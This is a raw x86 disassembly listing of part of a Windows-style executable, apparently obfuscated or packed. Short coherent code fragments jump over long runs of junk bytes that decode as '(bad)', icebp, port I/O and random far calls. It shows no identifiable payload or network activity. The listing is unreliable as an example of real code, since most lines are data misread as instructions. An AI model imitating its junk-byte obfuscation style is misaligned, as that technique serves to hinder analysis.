  405121:	rol    DWORD PTR [edx-0x36],1
  405124:	sub    eax,0xf67c9579
  405129:	int    0x44
  40512b:	js     0x40510c
  40512d:	rol    BYTE PTR [esi],cl
  40512f:	loop   0x40510c
  405131:	pop    ds
  405132:	push   esp
  405133:	jb     0x40510a
  405135:	mov    edi,0x784bf91e
  40513a:	aaa    
  40513b:	stos   DWORD PTR es:[edi],eax
  40513c:	aad    0xf1
  40513e:	hlt    
  40513f:	lds    ebx,FWORD PTR [edi]
  405141:	in     al,0xc
  405143:	jge    0x4050fe
  405145:	jnp    0x405178
  405147:	cmp    BYTE PTR [eax+0x357de01e],0x83
  40514e:	adc    al,0xf
  405150:	scas   eax,DWORD PTR es:[edi]
  405151:	sti    
  405152:	mov    ebx,DWORD PTR [ebp-0x18]
  405155:	xor    ebx,eax
  405157:	sub    edx,ecx
  405159:	lea    edi,[edi+ebx*1+0x32729b]
  405160:	jmp    0x405463
  405165:	pusha  
  405166:	das    
  405167:	sti    
  405168:	pop    eax
  405169:	push   ecx
  40516a:	push   0x65ca3761
  40516f:	out    0x76,eax
  405171:	xchg   edx,eax
  405172:	data16 jmp 0x405144
  405175:	imul   BYTE PTR [esi+edi*2]
  405178:	jle    0x4051d2
  40517a:	jl     0x4051fa
  40517c:	jle    0x405173
  40517e:	jmp    0x4051b4
  405180:	fwait
  405181:	test   DWORD PTR [ebp-0x2b3eabd8],edx
  405187:	aad    0xf8
  405189:	add    BYTE PTR [esi+0x1eeb2049],al
  40518f:	mov    eax,0x4616c745
  405194:	test   al,0x4e
  405196:	inc    ebp
  405197:	daa    
  405198:	hlt    
  405199:	mov    al,ds:0x50cd0f5b
  40519e:	or     eax,0x50e050a9
  4051a3:	nop
  4051a4:	not    bh
  4051a6:	xchg   edx,eax
  4051a7:	mov    DWORD PTR [edx-0x60],eax
  4051aa:	les    esp,FWORD PTR [ecx-0x3e]
  4051ad:	xor    eax,0x914621c6
  4051b2:	xchg   edx,eax
  4051b3:	xor    al,0xd8
  4051b5:	loop   0x405189
  4051b7:	nop
  4051b8:	aad    0x6d
  4051ba:	nop
  4051bb:	jge    0x405161
  4051bd:	cmp    BYTE PTR [eax-0x70077fdf],ch
  4051c3:	(bad)  
  4051c4:	fbstp  TBYTE PTR [edi]
  4051c6:	pop    esp
  4051c7:	mov    esp,0x91d7cc6c
  4051cc:	mov    ecx,ss
  4051ce:	jbe    0x4051ce
  4051d0:	and    al,0x57
  4051d2:	fdivp  st(5),st
  4051d4:	fld    QWORD PTR [edi]
  4051d6:	fwait
  4051d7:	mov    dh,0xb7
  4051d9:	in     al,dx
  4051da:	ret    
  4051db:	xor    edi,DWORD PTR [edx]
  4051dd:	mov    eax,0x297037e6
  4051e2:	or     BYTE PTR [esi+0x129a28aa],0x28
  4051e9:	mov    ah,ch
  4051eb:	jge    0x40519f
  4051ed:	cmp    eax,0xc4e14297
  4051f2:	push   ecx
  4051f3:	in     eax,0xe1
  4051f5:	jno    0x405203
  4051f7:	xchg   ebx,eax
  4051f8:	out    0x57,eax
  4051fa:	mov    dl,BYTE PTR gs:[eax+0x6d9e4233]
  405201:	loope  0x4051d0
  405203:	xor    DWORD PTR [eax-0x12b43968],esi
  405209:	jmp    0x4051e2
  40520b:	in     eax,0x84
  40520d:	mov    ebx,0xaa0031e2
  405212:	push   cs
  405213:	jle    0x405254
  405215:	jnp    0x405202
  405217:	xchg   ebx,eax
  405218:	xchg   esi,eax
  405219:	fidivr WORD PTR [bp+0xe]
  40521d:	idiv   DWORD PTR [eax]
  40521f:	xchg   ebp,eax
  405220:	test   al,0xf7
  405222:	dec    esp
  405223:	mov    ebp,0x541d286
  405228:	pop    ebx
  405229:	mov    esp,0x100bd94d
  40522e:	or     ebx,DWORD PTR [ebx+edi*1-0x1]
  405232:	adc    ah,BYTE PTR [ebx-0x49]
  405235:	pop    ebx
  405236:	jns    0x40527f
  405238:	and    al,0x65
  40523a:	xchg   BYTE PTR [eax+edx*2+0x13eb34fa],al
  405241:	shl    ah,1
  405243:	mov    ebx,0x91d059a2
  405248:	loopne 0x40524a
  40524a:	mov    fs,WORD PTR [ecx+esi*1]
  40524d:	retf   0xb776
  405250:	xchg   esi,eax
  405251:	mov    edx,0x68b2b77e
  405256:	aas    
  405257:	daa    
  405258:	pop    esp
  405259:	nop
  40525a:	sbb    eax,0x8d3735a6
  40525f:	and    DWORD PTR [eax],ecx
  405261:	jo     0x40529c
  405263:	pop    edi
  405264:	jle    0x405255
  405266:	pop    ecx
  405267:	lds    esi,FWORD PTR [eax-0x44]
  40526a:	or     dl,BYTE PTR [eax+0x32d0f125]
  405270:	cmc    
  405271:	sbb    BYTE PTR [edx],cl
  405273:	mov    ch,0x30
  405275:	mov    edx,0x3f2fefcb
  40527a:	or     BYTE PTR [ebp+ecx*8+0x52],al
  40527e:	sbb    bh,dl
  405280:	xor    al,0x94
  405282:	(bad)  
  405283:	sti    
  405284:	ror    BYTE PTR [esi],0xc0
  405287:	mov    al,0xb9
  405289:	cmp    dh,BYTE PTR [eiz*1-0x42702a1b]
  405290:	bound  eax,QWORD PTR [ecx]
  405292:	inc    eax
  405293:	sub    DWORD PTR [edi],edi
  405295:	data16 (bad) 
  405297:	repnz push 0xa1549b64
  40529d:	in     al,dx
  40529e:	mov    cl,0x66
  4052a0:	and    DWORD PTR [ecx-0x4c],esp
  4052a3:	and    cl,BYTE PTR [ecx]
  4052a5:	es mov ecx,esp
  4052a8:	mov    al,0xb9
  4052aa:	sti    
  4052ab:	ret    
  4052ac:	or     eax,0xdf5f000d
  4052b1:	jb     0x4052e6
  4052b3:	ret    
  4052b4:	push   fs
  4052b6:	jle    0x4052c1
  4052b8:	jge    0x405293
  4052ba:	sbb    eax,0x25e8e714
  4052bf:	in     al,dx
  4052c0:	pusha  
  4052c1:	mov    ebp,0xcc736128
  4052c6:	jge    0x405258
  4052c8:	adc    BYTE PTR [ebp-0x75039753],ah
  4052ce:	cmp    ecx,ecx
  4052d0:	push   es
  4052d1:	inc    ebp
  4052d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052d3:	sbb    BYTE PTR [ecx+0x50e5ba2d],bh
  4052d9:	mov    bl,0x9a
  4052db:	hlt    
  4052dc:	add    BYTE PTR [eax],bh
  4052de:	in     eax,dx
  4052df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052e0:	in     eax,dx
  4052e1:	(bad)  [edx-0x2b]
  4052e4:	and    ebx,DWORD PTR [ecx+0x42]
  4052e7:	pop    ds
  4052e8:	ror    DWORD PTR [edi+0x6b16346b],cl
  4052ee:	stos   BYTE PTR es:[edi],al
  4052ef:	pushf  
  4052f0:	mov    al,0xc3
  4052f2:	dec    ebx
  4052f3:	scas   al,BYTE PTR es:[edi]
  4052f4:	out    0x5f,al
  4052f6:	popf   
  4052f7:	data16 ins BYTE PTR es:[edi],dx
  4052f9:	inc    eax
  4052fa:	in     al,dx
  4052fb:	sub    eax,ebp
  4052fd:	jecxz  0x405349
  4052ff:	lock test al,0xa7
  405302:	scas   al,BYTE PTR es:[edi]
  405303:	pop    ss
  405304:	cmp    DWORD PTR [ebp-0x5f519458],eax
  40530a:	push   0x93f3ef8b
  40530f:	xchg   ebp,eax
  405310:	aad    0xb
  405312:	push   cs
  405313:	inc    esp
  405314:	aaa    
  405315:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405316:	(bad)  
  405317:	cdq    
  405318:	dec    ebp
  405319:	inc    esp
  40531a:	lods   eax,DWORD PTR ds:[esi]
  40531b:	pusha  
  40531c:	mov    ?,esi
  40531e:	cmp    eax,0xd138b19c
  405323:	retf   0x524e
  405326:	sbb    eax,0x8f391010
  40532c:	inc    ebp
  40532d:	or     al,0x39
  40532f:	jb     0x405399
  405331:	imul   esi,DWORD PTR [ebx+edi*8+0x7],0x4049c4b2
  405339:	pop    ss
  40533a:	adc    al,0xee
  40533c:	sbb    ah,BYTE PTR [ecx+0x5176d232]
  405342:	fs call 0xe8743580
  405348:	xor    al,0xf5
  40534a:	jno    0x40530a
  40534c:	sbb    eax,0x1cd53031
  405351:	jmp    0x31178179
  405356:	js     0x4053a6
  405358:	ss sub esp,esi
  40535b:	push   0x5936752a
  405360:	mov    bl,0xd7
  405362:	iret   
  405363:	out    dx,al
  405364:	and    esi,DWORD PTR [eax-0x3f2e7a21]
  40536a:	ror    DWORD PTR ds:0x32501828,0xd2
  405371:	dec    esp
  405372:	pop    ecx
  405373:	icebp  
  405374:	dec    esp
  405375:	loop   0x4053e1
  405377:	pand   mm6,QWORD PTR [edi+0x4dad5038]
  40537e:	jp     0x405390
  405380:	mov    gs:0x99d0f365,al
  405386:	stos   BYTE PTR es:[edi],al
  405387:	cs icebp 
  405389:	icebp  
  40538a:	rcr    DWORD PTR [ebx+eax*4],0x1f
  40538e:	mov    al,ds:0x5d944ca4
  405393:	jecxz  0x405333
  405395:	data16 cmp BYTE PTR [ecx+ebx*1-0x6cc0d75f],dh
  40539d:	add    esp,DWORD PTR [ebp+0x11c447f0]
  4053a3:	mov    bl,0xd9
  4053a5:	jg     0x405420
  4053a7:	pop    eax
  4053a8:	repz stc 
  4053aa:	ficom  WORD PTR [edi+edx*1-0xe915d8]
  4053b1:	ret    
  4053b2:	and    al,0xb1
  4053b4:	fsubr  DWORD PTR [ebx+eiz*2]
  4053b7:	inc    esi
  4053b8:	(bad)  
  4053b9:	(bad)  
  4053ba:	adc    esi,DWORD PTR [ebp-0x42e77c72]
  4053c0:	dec    edi
  4053c1:	mov    esp,0xf268e3
  4053c6:	jl     0x4053ee
  4053c8:	in     al,dx
  4053c9:	mov    ah,0x11
  4053cb:	pop    ecx
  4053cc:	stc    
  4053cd:	es mov edi,0x603eadbf
  4053d3:	or     esp,DWORD PTR [esi-0x33]
  4053d6:	lods   al,BYTE PTR ds:[esi]
  4053d7:	add    esi,DWORD PTR [edi]
  4053d9:	int3   
  4053da:	loop   0x40544f
  4053dc:	jmp    0x23a21743
  4053e1:	add    ebp,edi
  4053e3:	dec    DWORD PTR [ebx]
  4053e5:	dec    ebp
  4053e6:	ins    DWORD PTR es:[edi],dx
  4053e7:	iret   
  4053e8:	jae    0x405457
  4053ea:	fld    QWORD PTR [edi+0x0]
  4053ed:	(bad)  
  4053ee:	test   DWORD PTR [ecx-0x2b],eax
  4053f1:	out    0x15,eax
  4053f3:	(bad)  
  4053f4:	sbb    eax,0x1d75a021
  4053f9:	mov    al,0x83
  4053fb:	cmp    eax,0x392ea62
  405400:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405401:	sbb    eax,0xec8d7a67
  405406:	sar    dh,1
  405408:	in     eax,dx
  405409:	pop    edi
  40540a:	jne    0x40538d
  40540c:	es inc edx
  40540e:	call   0x91e1:0xe86047c6
  405415:	les    ebp,FWORD PTR [ebp+ecx*1-0xb746c76]
  40541c:	aad    0x76
  40541e:	cdq    
  40541f:	test   al,0x75
  405421:	xor    al,0x3b
  405423:	nop
  405424:	mov    ah,0xc3
  405426:	scas   al,BYTE PTR es:[edi]
  405427:	jbe    0x40544e
  405429:	jne    0x405467
  40542b:	aad    0xb8
  40542d:	mov    esi,0xe129977e
  405432:	outs   dx,DWORD PTR ds:[esi]
  405433:	push   ebx
  405434:	pop    DWORD PTR [edx+ebx*2]
  405437:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405438:	and    eax,0x2b052e09
  40543d:	xchg   ecx,eax
  40543e:	mov    al,ds:0x3121d640
  405443:	mov    ds:0x90565d9f,eax
  405448:	ror    DWORD PTR [esi+eax*1+0x63],0x55
  40544d:	and    BYTE PTR [eax+0x2d],0x83
  405451:	inc    esi
  405452:	test   eax,0x6798baa5
  405457:	daa    
  405458:	sbb    eax,0x2c91bcdc
  40545d:	push   cs
  40545e:	ins    BYTE PTR es:[edi],dx
  40545f:	imul   ecx,eax,0xfa3b7d02
  405465:	jbe    0x404ac0
  40546b:	mov    edx,DWORD PTR [ebp-0xc]
  40546e:	mov    edi,DWORD PTR [ebp-0x24]
  405471:	jmp    0x405774
  405476:	outs   dx,DWORD PTR ds:[esi]
  405477:	fisttp QWORD PTR [esi+0x6f6d8cef]
  40547d:	pop    ebp
  40547e:	fmul   QWORD PTR [edi+0x661cfbb8]
  405484:	call   0x587e:0x7e2bd008
  40548b:	jl     0x40550b
  40548d:	jle    0x405476
  40548f:	or     bh,cl
  405491:	xor    eax,0x606b608c
  405496:	cmp    esi,DWORD PTR [esi+0x57]
  405499:	push   edx
  40549a:	fucom  st(4)
  40549c:	test   BYTE PTR [edi+0x6],ch
  40549f:	aaa    
  4054a0:	cld    
  4054a1:	cmc    
  4054a2:	cwde   
  4054a3:	jb     0x405462
  4054a5:	sbb    eax,0x52a93f9f
  4054aa:	lahf   
  4054ab:	je     0x40546a
  4054ad:	adc    BYTE PTR ds:0xc01f2332,ah
  4054b3:	adc    eax,0xda152a3e
  4054b8:	jnp    0x405482
  4054ba:	call   0x8cf7786c
  4054bf:	adc    al,0xc0
  4054c1:	ins    BYTE PTR es:[edi],dx
  4054c2:	mov    dl,0x83
  4054c4:	(bad)  
  4054c5:	aad    0x61
  4054c7:	pop    esi
  4054c8:	jmp    0x56fa:0x92406a67
  4054cf:	nop
  4054d0:	imul   ebp,DWORD PTR [ebx],0xffffffaa
  4054d3:	jmp    0xda50:0x13c4a2df
  4054da:	pusha  
  4054db:	cmc    
  4054dc:	das    
  4054dd:	sub    BYTE PTR [esi+0x26d0eef5],bl
  4054e3:	ins    BYTE PTR es:[edi],dx
  4054e4:	push   eax
  4054e5:	mov    edi,0x4bc9dfdf
  4054ea:	data16 jl 0x405552
  4054ed:	inc    ecx
  4054ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054ef:	xor    bh,BYTE PTR [eax]
  4054f1:	(bad)  
  4054f3:	jmp    0x40d79205
  4054f8:	jge    0x405529
  4054fa:	retf   0xc39f
  4054fd:	inc    edi
  4054fe:	jge    0x405556
  405500:	mov    esi,DWORD PTR [edi]
  405502:	xchg   ecx,eax
  405503:	jp     0x40549d
  405505:	mov    eax,ds:0x3f21f535
  40550a:	js     0x405507
  40550c:	mov    BYTE PTR [edi-0x9f386c1],ch
  405512:	mov    edi,0x4a1987c5
  405517:	mov    esp,0x2ef9f09
  40551c:	mov    eax,ds:0x27084cce
  405521:	push   ebp
  405522:	fmul   st(5),st
  405524:	xchg   ebx,eax
  405525:	mov    dh,0x95
  405527:	or     al,0xe2
  405529:	jnp    0x40552d
  40552b:	sar    DWORD PTR [si+0x36d0],0x7d
  405531:	sub    esp,ecx
  405533:	(bad)  
  405534:	dec    eax
  405535:	outs   dx,DWORD PTR ds:[esi]
  405536:	enter  0x2408,0xce
  40553a:	cdq    
  40553b:	mov    dh,0xd4
  40553d:	repz pop ss
  40553f:	es popa 
  405541:	arpl   di,bp
  405543:	js     0x405593
  405545:	cs xchg ecx,ecx
  405548:	cmp    al,0x27
  40554a:	inc    esp
  40554b:	lahf   
  40554c:	stos   BYTE PTR es:[edi],al
  40554d:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40554f:	pop    ecx
  405550:	sbb    eax,0x3a168cc5
  405555:	imul   edx,esi,0x62
  405558:	jg     0x40551c
  40555a:	xchg   esp,eax
  40555b:	ja     0x4054f6
  40555d:	jne    0x4054ed
  40555f:	jno    0x405553
  405561:	jno    0x4055d7
  405563:	stos   DWORD PTR es:[edi],eax
  405564:	les    edx,FWORD PTR [edi+0x5e]
  405567:	(bad)  
  405568:	pushf  
  405569:	xchg   ecx,eax
  40556a:	clc    
  40556b:	dec    ebp
  40556c:	jmp    0x4054ef
  40556e:	jmp    0xde8d:0xa04b279f
  405575:	daa    
  405576:	retf   
  405577:	mov    ah,0xa8
  405579:	push   edx
  40557a:	(bad)  
  40557b:	(bad)  
  40557c:	repnz mov edi,0x7ffda9b8
  405582:	mov    bl,0x58
  405584:	repz adc BYTE PTR [edx+esi*2-0x10],al
  405589:	jmp    0xc578d7cd
  40558e:	push   edi
  40558f:	test   BYTE PTR [ecx-0x633974e1],ch
  405595:	cmp    ebx,DWORD PTR [ecx+0xf]
  405598:	pusha  
  405599:	xor    DWORD PTR [esp+ecx*8-0x5b2aca08],edx
  4055a0:	and    DWORD PTR [eax+edi*8-0x69],ebp
  4055a4:	dec    esp
  4055a5:	mov    eax,ds:0x77b9b4cb
  4055aa:	aad    0xcc
  4055ac:	inc    eax
  4055ad:	dec    esp
  4055ae:	call   0xad3c:0x31b631e7
  4055b5:	ins    DWORD PTR es:[edi],dx
  4055b6:	inc    edx
  4055b7:	sub    ecx,DWORD PTR [ebx+0x8]
  4055ba:	enter  0xc3ca,0x2c
  4055be:	mov    BYTE PTR [eax-0x745a83ad],ch
  4055c4:	adc    ecx,0xfc82bcd2
  4055ca:	cmp    DWORD PTR [ecx+0x1e],edx
  4055cd:	imul   esp
  4055cf:	popa   
  4055d0:	pop    ss
  4055d1:	xchg   esi,eax
  4055d2:	in     eax,0x70
  4055d4:	lods   al,BYTE PTR ds:[esi]
  4055d5:	lds    edx,FWORD PTR [ebp-0x5d531d56]
  4055db:	pop    ss
  4055dc:	imul   edx,DWORD PTR [esi],0xffffff89
  4055df:	lods   eax,DWORD PTR ds:[esi]
  4055e0:	mov    edi,0xbdeec68c
  4055e5:	outs   dx,BYTE PTR ds:[esi]
  4055e6:	call   0xce105b53
  4055eb:	mov    ecx,0x8b38dca
  4055f0:	arpl   WORD PTR [ebx+ecx*1-0x39],sp
  4055f4:	pop    ss
  4055f5:	inc    eax
  4055f6:	xor    ebx,DWORD PTR [eax]
  4055f8:	sbb    eax,DWORD PTR [ebp+0x7d]
  4055fb:	dec    ebx
  4055fc:	test   eax,0x232ed85c
  405601:	push   edi
  405602:	test   DWORD PTR [esi+eax*4],esp
  405605:	sub    DWORD PTR [esi+0x66c73c51],edi
  40560b:	xchg   edx,eax
  40560c:	mov    cl,0xb3
  40560e:	sbb    al,bh
  405610:	test   eax,0x9ff1dede
  405615:	xchg   edi,eax
  405616:	rcr    BYTE PTR [esi+edx*8+0xd96291a],1
  40561d:	icebp  
  40561e:	xor    cl,bl
  405620:	lods   eax,DWORD PTR ds:[esi]
  405621:	or     edi,DWORD PTR [edi+0xca2bf87]
  405627:	push   0xffffffd3
  405629:	dec    eax
  40562a:	loop   0x405696
  40562c:	mov    ch,0xca
  40562e:	pop    edx
  40562f:	(bad)  
  405630:	ficomp WORD PTR [eax+0x4c]
  405633:	ret    
  405634:	call   0x1a6f8919
  405639:	outs   dx,BYTE PTR ds:[esi]
  40563a:	xor    BYTE PTR [esp+edi*1],ch
  40563d:	inc    ebp
  40563e:	pop    eax
  40563f:	mov    eax,ds:0xa630c6cb
  405644:	callw  0xb6be
  405648:	inc    eax
  405649:	add    BYTE PTR ds:0x83314017,dh
  40564f:	sub    al,0x95
  405651:	jle    0x4055e8
  405653:	stos   BYTE PTR es:[edi],al
  405654:	jo     0x405602
  405656:	xor    ebx,0xfffffffb
  405659:	gs sub al,0x19
  40565c:	mov    bl,0x37
  40565e:	ins    DWORD PTR es:[edi],dx
  40565f:	or     eax,DWORD PTR [edx-0xc]
  405662:	enter  0xe7ec,0x46
  405666:	call   0x6c65:0x7e534ac0
  40566d:	dec    esi
  40566e:	and    al,0x65
  405670:	stos   DWORD PTR es:[edi],eax
  405671:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  405673:	inc    ebp
  405674:	jg     0x4056a3
  405676:	xor    BYTE PTR [esi+0x4f],bh
  405679:	inc    ebp
  40567a:	sub    DWORD PTR [eax+0x7f],ebx
  40567d:	inc    edx
  40567e:	jmp    DWORD PTR [edi]
  405680:	shr    DWORD PTR [ebp+0x75],0x29
  405684:	push   ss
  405685:	icebp  
  405686:	mov    bh,0x72
  405688:	lock daa 
  40568a:	mov    esp,0x2b04459b
  40568f:	push   0x38fbcb72
  405694:	cmp    edi,DWORD PTR [eax+0x62ef1252]
  40569a:	gs mov edx,db2
  40569e:	push   ss
  40569f:	mov    ?,WORD PTR [edx]
  4056a1:	push   esp
  4056a2:	lock jno 0x405669
  4056a5:	std    
  4056a6:	mov    edx,0x5194354e
  4056ab:	push   0xffffff8d
  4056ad:	jg     0x40568b
  4056af:	push   es
  4056b0:	test   esi,esi
  4056b2:	adc    eax,0x28f307b1
  4056b7:	and    al,0x3a
  4056b9:	repnz dec ebx
  4056bb:	call   0x4155:0xac510600
  4056c2:	push   0xba32bfaf
  4056c7:	inc    esi
  4056c8:	retf   
  4056c9:	fbstp  TBYTE PTR [edi+eiz*8]
  4056cc:	dec    BYTE PTR [ebx-0x400d1a32]
  4056d2:	dec    eax
  4056d3:	push   ecx
  4056d4:	sbb    edx,DWORD PTR [esi]
  4056d6:	or     ecx,DWORD PTR [edx]
  4056d8:	xchg   ebx,eax
  4056d9:	sub    ecx,ecx
  4056db:	sahf   
  4056dc:	sbb    BYTE PTR [eax-0x1d4bf4e4],ah
  4056e2:	out    0x56,eax
  4056e4:	shr    DWORD PTR [esi-0x2],cl
  4056e7:	lea    ecx,[ecx+0x645fa520]
  4056ed:	and    BYTE PTR [edi+esi*1-0xe],0xa8
  4056f2:	test   eax,0xf1cd40cb
  4056f7:	push   eax
  4056f8:	dec    ecx
  4056f9:	les    ebp,FWORD PTR [ebx+0x3b]
  4056fc:	clc    
  4056fd:	push   edi
  4056fe:	outs   dx,BYTE PTR ds:[esi]
  4056ff:	and    bh,BYTE PTR [ecx]
  405701:	xchg   DWORD PTR [ebp-0x26577862],edi
  405707:	stc    
  405708:	loope  0x4056e1
  40570a:	xlat   BYTE PTR ds:[ebx]
  40570b:	cmp    dl,dh
  40570d:	xchg   DWORD PTR [esi],eax
  40570f:	pop    ebp
  405710:	and    BYTE PTR [ebx-0x77],bh
  405713:	xchg   esi,eax
  405714:	pop    ss
  405715:	or     dh,BYTE PTR [esi-0x60a075e0]
  40571b:	ret    0xe10b
  40571e:	test   eax,0xe1dd343d
  405723:	sbb    eax,0x3934833d
  405728:	js     0x40571a
  40572a:	pop    edi
  40572b:	les    eax,FWORD PTR [edi+edx*4+0x5a]
  40572f:	mov    cl,0x32
  405731:	xlat   BYTE PTR ds:[ebx]
  405732:	add    ebp,eax
  405734:	push   eax
  405735:	pop    ss
  405736:	scas   eax,DWORD PTR es:[edi]
  405737:	mov    bl,0xc6
  405739:	push   edi
  40573a:	rcl    DWORD PTR [eax-0x7c],cl
  40573d:	xchg   ebp,eax
  40573e:	lods   al,BYTE PTR ds:[esi]
  40573f:	jb     0x4056fa
  405741:	(bad)  
  405742:	jne    0x4057c2
  405744:	pop    ebp
  405745:	cmp    eax,0x3b3a1c93
  40574a:	rol    ch,1
  40574c:	inc    eax
  40574d:	mov    ch,bh
  40574f:	cmp    DWORD PTR [eax],0xfffffffa
  405752:	xor    BYTE PTR [ebx+0x7a],bh
  405755:	add    DWORD PTR [ebp-0x3ee21831],esi
  40575b:	mov    ebp,0xaac45763
  405760:	lds    ebp,FWORD PTR [edi-0x377a761b]
  405766:	int3   
  405767:	cmp    eax,DWORD PTR [edi+ecx*2+0x46b79ebe]
  40576e:	cmp    al,BYTE PTR [ebp+0x7ad1be0a]
  405774:	xor    edx,eax
  405776:	add    edx,ecx
  405778:	imul   edx,edi
  40577b:	mov    edi,DWORD PTR [ebp-0x18]
  40577e:	xor    edi,eax
  405780:	add    edx,edi
  405782:	mov    edi,DWORD PTR [ebp-0x8]
  405785:	lea    edx,[edx+edi*1+0x32729b]
  40578c:	mov    DWORD PTR [ebp-0x8],edx
  40578f:	mov    edx,DWORD PTR [ebp-0x20]
  405792:	xor    edx,eax
  405794:	mov    edi,0xffcd8d65
  405799:	sub    edi,edx
  40579b:	add    edi,DWORD PTR [ebp-0x10]
  40579e:	mov    edx,DWORD PTR [ebp-0x20]
  4057a1:	mov    ebx,DWORD PTR [ebp-0x8]
  4057a4:	xor    edx,eax
  4057a6:	add    edx,ecx
  4057a8:	imul   edx,ebx
  4057ab:	cmp    edx,edi
  4057ad:	jbe    0x4038ea
  4057b3:	pop    ebx
  4057b4:	pop    edi
  4057b5:	leave  
  4057b6:	ret    0x8
  4057b9:	push   ebp
  4057ba:	mov    ebp,esp
  4057bc:	push   ecx
  4057bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4057c0:	and    eax,DWORD PTR ds:0x43371b
  4057c6:	mov    eax,0x7510854
  4057cb:	xor    DWORD PTR ds:0x433623,0x433603
  4057d5:	xor    ecx,eax
  4057d7:	not    DWORD PTR ds:0x43365f
  4057dd:	add    ecx,0x32729b
  4057e3:	jmp    0x405b32
  4057e8:	scas   eax,DWORD PTR es:[edi]
  4057e9:	inc    BYTE PTR [ebp-0x39]
  4057ec:	jne    0x4057b3
  4057ee:	lods   eax,DWORD PTR ds:[esi]
  4057ef:	jbe    0x4057a1
  4057f1:	loopne 0x4057f0
  4057f3:	mov    al,0x1a
  4057f5:	dec    edi
  4057f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057f7:	test   al,0x3a
  4057f9:	ss jle 0x40587a
  4057fc:	sub    al,0x7d
  4057fe:	jle    0x40587e
  405800:	fsubr  QWORD PTR [eax]
  405802:	jl     0x40583f
  405804:	retf   0x2aea
  405807:	sub    eax,ebx
  405809:	sbb    ah,BYTE PTR [eax+ebx*4-0x20]
  40580d:	jns    0x405868
  40580f:	sbb    BYTE PTR [esi+ebx*2],bh
  405812:	inc    edx
  405813:	pop    ss
  405814:	loop   0x4057dc
  405816:	mov    edi,0x7b723a8e
  40581b:	out    0x44,al
  40581d:	rcl    DWORD PTR [eax],0x9c
  405820:	pop    esi
  405821:	inc    ebx
  405822:	ret    
  405823:	mov    ah,0x89
  405825:	inc    esp
  405826:	sbb    DWORD PTR fs:[ecx],ecx
  405829:	jmp    DWORD PTR [edi-0x71]
  40582c:	adc    BYTE PTR [ebx],ch
  40582e:	call   0xebfe:0xe4a9d1c4
  405835:	dec    ebx
  405836:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405837:	sti    
  405838:	mov    bh,0x48
  40583a:	or     eax,0xa1279af0
  40583f:	lock leave 
  405841:	mov    cl,0xf4
  405843:	xor    eax,0x269edf6b
  405848:	inc    esp
  405849:	xor    BYTE PTR [di+0x38],bl
  40584d:	jl     0x4058c4
  40584f:	shl    ebp,0xbb
  405852:	add    DWORD PTR [esi+ecx*8-0x7d],esi
  405856:	jl     0x40580a
  405858:	stos   BYTE PTR es:[edi],al
  405859:	test   eax,0x46ccb54f
  40585e:	sahf   
  40585f:	sub    bl,ch
  405861:	cmc    
  405862:	(bad)  
  405863:	inc    DWORD PTR [edi+0x566a565]
  405869:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40586a:	dec    edi
  40586b:	pusha  
  40586c:	dec    ecx
  40586d:	inc    esp
  40586e:	imul   ecx,DWORD PTR [ecx-0x16],0xfffffff2
  405872:	(bad)  
  405873:	adc    BYTE PTR [edx],dl
  405875:	add    ah,BYTE PTR [ebx+edi*1]
  405878:	iret   
  405879:	lods   al,BYTE PTR ds:[esi]
  40587a:	or     BYTE PTR fs:[esi+0x2d],bl
  40587e:	xchg   BYTE PTR [eax-0x6b],bl
  405881:	in     al,dx
  405882:	sub    BYTE PTR [ebx-0x61ef7ab3],ch
  405888:	retf   
  405889:	pop    esi
  40588a:	out    0x80,al
  40588c:	push   ebx
  40588d:	jmp    0x405894
  40588f:	xlat   BYTE PTR ds:[ebx]
  405890:	into   
  405891:	add    DWORD PTR [eax+ecx*1],esi
  405894:	push   0xffffffc0
  405896:	repnz mov dh,bl
  405899:	xchg   esp,eax
  40589a:	lahf   
  40589b:	xchg   ebx,eax
  40589c:	sub    al,0x7e
  40589e:	loope  0x405857
  4058a0:	loope  0x405886
  4058a2:	cmp    ecx,DWORD PTR [edi+0x5]
  4058a5:	jnp    0x405905
  4058a7:	call   0x86ac:0x758f9872
  4058ae:	dec    edi
  4058af:	shr    BYTE PTR [eax+0xff02745],0x3
  4058b6:	or     ch,0x4a
  4058b9:	cs (bad) 
  4058bb:	mov    al,0x64
  4058bd:	stos   BYTE PTR es:[edi],al
  4058be:	cmp    BYTE PTR [edi],ch
  4058c0:	push   cs
  4058c1:	mov    eax,0x2975903f
  4058c6:	pop    eax
  4058c7:	jl     0x4058eb
  4058c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058ca:	inc    esi
  4058cb:	adc    eax,0x88b7acc3
  4058d0:	out    dx,eax
  4058d1:	jmp    0x405902
  4058d3:	jo     0x40585f
  4058d5:	stos   BYTE PTR es:[edi],al
  4058d6:	xchg   esi,eax
  4058d7:	sbb    bh,BYTE PTR [edx]
  4058d9:	sub    al,0xeb
  4058db:	in     al,0xb1
  4058dd:	pop    es
  4058de:	and    eax,0xf2cf3955
  4058e3:	icebp  
  4058e4:	cld    
  4058e5:	add    BYTE PTR ds:0x335d3aea,ah
  4058eb:	and    DWORD PTR [esi],ebx
  4058ed:	ret    0x5966
  4058f0:	mov    al,0x94
  4058f2:	dec    ebp
  4058f3:	xchg   edi,esp
  4058f5:	fucom  st(1)
  4058f7:	and    DWORD PTR [ebx+0x76ce192],eax
  4058fd:	jne    0x405948
  4058ff:	mov    ah,0x7d
  405901:	ss leave 
  405903:	push   ss
  405904:	shl    al,1
  405906:	push   0x70db3db1
  40590b:	shl    cl,cl
  40590d:	imul   ebp,esi,0x54
  405910:	ins    DWORD PTR es:[edi],dx
  405911:	xlat   BYTE PTR ds:[ebx]
  405912:	xchg   esp,eax
  405913:	stc    
  405914:	adc    eax,0x4521bcda
  405919:	ficom  DWORD PTR [edx-0x5a]
  40591c:	mov    dl,BYTE PTR [edi-0x7b77193]
